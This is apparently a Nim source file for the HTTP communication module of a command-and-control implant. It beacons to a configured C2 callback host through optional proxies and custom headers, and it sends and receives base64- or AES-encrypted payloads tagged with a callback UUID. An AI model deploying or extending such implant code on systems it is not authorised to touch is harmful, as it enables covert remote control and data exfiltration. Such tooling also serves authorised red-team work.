import std/[httpclient, base64, strutils, json]
import ../config
import ../utils/crypto

type
  HttpProfile* = ref object
    config: Config
    aesKey: seq[byte]
    client: HttpClient

proc newHttpProfile*(): HttpProfile =
  ## Create a new HTTP profile
  result = HttpProfile()
  result.config = getConfig()
  result.client = newHttpClient()
  
  # Set User-Agent
  result.client.headers = newHttpHeaders({"User-Agent": result.config.userAgent})
  
  # Parse and add custom headers if provided (JSON format)
  if result.config.headers.len > 0:
    try:
      let headersJson = parseJson(result.config.headers)
      for key, val in headersJson.pairs:
        result.client.headers[key] = val.getStr()
    except:
      discard  # Ignore header parsing errors
  
  # Configure proxy if provided
  if result.config.proxyHost.len > 0 and result.config.proxyPort.len > 0:
    var proxyUrl = "http://" & result.config.proxyHost & ":" & result.config.proxyPort
    # Add auth if provided
    if result.config.proxyUser.len > 0 and result.config.proxyPass.len > 0:
      proxyUrl = "http://" & result.config.proxyUser & ":" & result.config.proxyPass & "@" & 
                 result.config.proxyHost & ":" & result.config.proxyPort
    try:
      result.client = newHttpClient(proxy = newProxy(proxyUrl))
      # Re-apply headers after creating new client with proxy
      result.client.headers = newHttpHeaders({"User-Agent": result.config.userAgent})
      if result.config.headers.len > 0:
        try:

          let headersJson = parseJson(result.config.headers)
          for key, val in headersJson.pairs:
            result.client.headers[key] = val.getStr()
        except:
          discard
    except:
      discard  # Ignore proxy configuration errors
  
  # Don't load AES key yet - will be set after key exchange or checkin

proc buildUrl(profile: HttpProfile): string =
  ## Build the full callback URL
  var host = profile.config.callbackHost
  # Strip any existing scheme from host
  if host.startsWith("http://"):
    host = host[7..^1]
  elif host.startsWith("https://"):
    host = host[8..^1]
  
  let scheme = if profile.config.callbackPort == "443": "https" else: "http"
  result = scheme & "://" & host & ":" & 
           profile.config.callbackPort & "/" & profile.config.postUri

proc send*(profile: HttpProfile, data: string, callbackUuid: string = ""): string =
  ## Send data to C2 server
  let url = profile.buildUrl()
  let uuid = if callbackUuid.len > 0: callbackUuid else: profile.config.uuid
  
  if profile.config.debug:
    echo "[DEBUG] === SENDING DATA ==="
    # Try to pretty-print JSON if it's valid JSON
    try:
      let jsonData = parseJson(data)
      echo "[DEBUG] Request JSON:"
      echo jsonData.pretty()
    except:
      # Not JSON or parse error, show raw
      echo "[DEBUG] Request data (first 500 chars): ", data[0..<min(500, data.len)]
  
  # Only encrypt if AES key is available AND we have a callback UUID
  var payload: string
  if profile.aesKey.len > 0 and callbackUuid.len > 0:
    if profile.config.debug:
      echo "[DEBUG] Encrypting payload with AES-256-CBC+HMAC"
      echo "[DEBUG] Data length: ", data.len, " bytes"
      echo "[DEBUG] AES key length: ", profile.aesKey.len, " bytes"
      echo "[DEBUG] UUID: ", uuid
    payload = encryptPayload(data, profile.aesKey, uuid)
    if profile.config.debug:
      echo "[DEBUG] Encrypted payload length: ", payload.len, " bytes"
  else:
    # No encryption, just base64(UUID + data)
    if profile.config.debug:
      echo "[DEBUG] Sending unencrypted payload (Base64 only)"
      echo "[DEBUG] Data length: ", data.len, " bytes"
      echo "[DEBUG] UUID: ", uuid
    payload = encode(uuid & data)
    if profile.config.debug:
      echo "[DEBUG] Encoded payload length: ", payload.len, " bytes"
  
  if profile.config.debug:
    echo "[DEBUG] Sending HTTP POST to: ", url
    echo "[DEBUG] Payload preview (first 100 chars): ", payload[0..<min(100, payload.len)]
  
  try:
    if profile.config.debug:
      echo "[DEBUG] Sending HTTP request..."
    
    let response = profile.client.postContent(url, payload)
    
    if profile.config.debug:
      echo "[DEBUG] HTTP response received"
      echo "[DEBUG] Response length: ", response.len, " bytes"
      echo "[DEBUG] Response preview (first 100 chars): ", response[0..<min(100, response.len)]
    
    # Decrypt response if AES key is available and we have callback UUID
    if profile.aesKey.len > 0 and callbackUuid.len > 0:
      if profile.config.debug:
        echo "[DEBUG] Decrypting response with AES-256-CBC+HMAC"
      result = decryptPayload(response, profile.aesKey)
      if profile.config.debug:
        echo "[DEBUG] Decrypted response length: ", result.len, " bytes"
    else:
      # No encryption, decode and skip UUID
      if profile.config.debug:
        echo "[DEBUG] Decoding unencrypted response (Base64)"
      let decoded = decode(response)
      if decoded.len > 36:
        result = decoded[36..^1]
      else:
        result = ""    
    # Try to parse and pretty-print response JSON
    if profile.config.debug and result.len > 0:
      echo "[DEBUG] === RECEIVED RESPONSE ==="
      try:
        let jsonResp = parseJson(result)
        echo "[DEBUG] Response JSON:"
        echo jsonResp.pretty()
      except:
        # Not JSON or parse error, show raw
        echo "[DEBUG] Response data (first 500 chars): ", result[0..<min(500, result.len)]
  except:
    if profile.config.debug:
      echo "[DEBUG] Request failed: ", getCurrentExceptionMsg()
    result = ""

proc setAesKey*(profile: var HttpProfile, key: seq[byte]) =
  ## Set the AES encryption key
  profile.aesKey = key

proc hasAesKey*(profile: HttpProfile): bool =
  ## Check if AES key is set
  result = profile.aesKey.len > 0

proc performKeyExchange*(profile: var HttpProfile): bool =
  ## Perform RSA key exchange to establish AES session key
  ## If encrypted exchange is not required, use the static PSK
  
  # If no encrypted exchange needed, just use the static PSK
  if not profile.config.encryptedExchange:
    if profile.config.debug:
      echo "[DEBUG] No key exchange required"
    # Don't set key yet - will be set after successful checkin
    return true
  
  # TODO: Implement full RSA key exchange
  # For now, fall back to using static PSK after checkin
  if profile.config.debug:
    echo "[DEBUG] RSA key exchange not yet implemented"
  return true
